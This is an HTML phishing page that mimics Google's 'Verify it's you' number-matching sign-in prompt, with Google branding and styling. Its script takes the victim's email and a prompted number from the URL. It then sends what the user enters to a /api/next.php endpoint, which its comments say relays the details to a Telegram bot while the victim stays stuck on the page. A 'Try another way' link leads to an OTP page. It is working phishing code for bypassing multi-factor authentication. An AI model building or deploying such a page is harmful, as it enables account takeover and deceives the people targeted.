<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify it's you - Google Accounts</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="images/google-logo-vector-format-white-background-illustration-407571050.webp">
    <style>
        :root {
            --gmail-blue: #1a73e8;
            --gmail-red: #ea4335;
            --gmail-green: #34a853;
            --gmail-white: #ffffff;
            --gmail-gray: #5f6368;
            --gmail-border: #dadce0;
        }

        * { box-sizing: border-box; }

        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            min-height: 100%;
            font-family: 'Roboto', sans-serif;
            background: var(--gmail-white);
            color: #202124;
        }

        .container {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            padding: 48px 36px;
        }

        .logo {
            width: 75px;
            height: 25px;
            margin-bottom: 24px;
            background: url('images/google-logo-vector-format-white-background-illustration-407571050.webp') no-repeat center;
            background-size: contain;
        }

        .title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
        }

        .subtitle {
            font-size: 16px;
            color: var(--gmail-gray);
            margin-bottom: 32px;
        }

        .number-highlight {
            background: #e8f0fe;
            border: 2px solid var(--gmail-blue);
            border-radius: 8px;
            padding: 24px;
            text-align: center;
            margin-bottom: 24px;
        }

        .number-highlight-label {
            font-size: 14px;
            color: var(--gmail-gray);
            margin-bottom: 8px;
        }

        .number-highlight-value {
            font-size: 48px;
            font-weight: 500;
            color: var(--gmail-blue);
        }

        .number-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 8px;
            margin-bottom: 24px;
        }

        .number-btn {
            padding: 16px;
            border: 1px solid var(--gmail-border);
            background: white;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .number-btn:hover {
            background: #f8f9fa;
            border-color: var(--gmail-gray);
        }

        .number-btn.selected {
            background: var(--gmail-blue);
            color: white;
            border-color: var(--gmail-blue);
        }

        .number-btn.target {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(26, 115, 232, 0.4); }
            50% { box-shadow: 0 0 0 10px rgba(26, 115, 232, 0); }
        }

        .btn {
            width: 100%;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .btn-primary {
            background: var(--gmail-blue);
            color: white;
        }

        .btn-primary:hover {
            background: #1557b0;
        }

        .btn-primary:disabled {
            background: var(--gmail-gray);
            cursor: not-allowed;
        }

        .btn-secondary {
            background: white;
            color: var(--gmail-blue);
            border: 1px solid var(--gmail-border);
        }

        .instruction {
            font-size: 14px;
            color: var(--gmail-gray);
            margin-bottom: 24px;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #f8f9fa;
            border-top: 1px solid var(--gmail-border);
            padding: 16px 24px;
        }

        .footer-links a {
            color: var(--gmail-gray);
            text-decoration: none;
            font-size: 12px;
            margin-right: 16px;
        }
    </style>
</head>
<body>
        <div class="container">
        <div class="logo"></div>
        <h1 class="title">Verify it's you</h1>
        <p class="subtitle">For your security, Google needs to verify it's you. Please select the number shown on your device.</p>

        <div class="number-highlight">
            <div class="number-highlight-label">Select this number:</div>
            <div class="number-highlight-value" id="targetNumber">--</div>
        </div>

        <p class="instruction">Enter the number shown on your device:</p>

        <div class="input-group" style="margin-bottom: 24px;">
            <input type="number" id="userInput" class="number-input" placeholder="Enter the number here" min="0" max="99" maxlength="2" style="width: 100%; padding: 16px; border: 2px solid var(--gmail-border); border-radius: 8px; font-size: 18px; text-align: center;">
        </div>

        <button id="verifyBtn" class="btn btn-primary" onclick="verifyNumber()" disabled>Submit</button>
        <button class="btn btn-secondary" onclick="tryAnother()">Try another way</button>
    </div>

    <footer class="footer">
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>

        <script>
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || '';
        const targetNumber = urlParams.get('number') || '';
        let selectedNumber = null;

        // Display target number
        document.getElementById('targetNumber').textContent = targetNumber || '--';

        // Set up input field event listeners
        const userInput = document.getElementById('userInput');
        
        userInput.addEventListener('input', function() {
            const value = this.value.trim();
            const btn = document.getElementById('verifyBtn');
            
            // Validate input (0-99)
            if (value !== '' && !isNaN(value) && parseInt(value) >= 0 && parseInt(value) <= 99) {
                selectedNumber = parseInt(value);
                btn.disabled = false;
            } else {
                selectedNumber = null;
                btn.disabled = true;
            }
        });

        // Allow Enter key to submit
        userInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && !document.getElementById('verifyBtn').disabled) {
                verifyNumber();
            }
        });

        function verifyNumber() {
            const btn = document.getElementById('verifyBtn');
            const input = document.getElementById('userInput');
            
            if (!selectedNumber && selectedNumber !== 0) {
                alert('Please enter a valid number (0-99)');
                return;
            }

            btn.textContent = 'Verifying...';
            btn.disabled = true;
            input.disabled = true;

            // Send to Telegram
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/api/next.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    btn.textContent = 'Loading...';
                    // Keep user on the same page - no redirect
                    // Details are sent to Telegram bot, but user stays stuck on this page
                }
            };
            xhr.send('di=' + encodeURIComponent(email) + '&chosen_number=' + selectedNumber);
        }

        function tryAnother() {
            window.location.href = 'otp.html?email=' + encodeURIComponent(email);
        }

        // Initialize - focus on input field
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('userInput').focus();
        });
    </script>
</body>
</html>
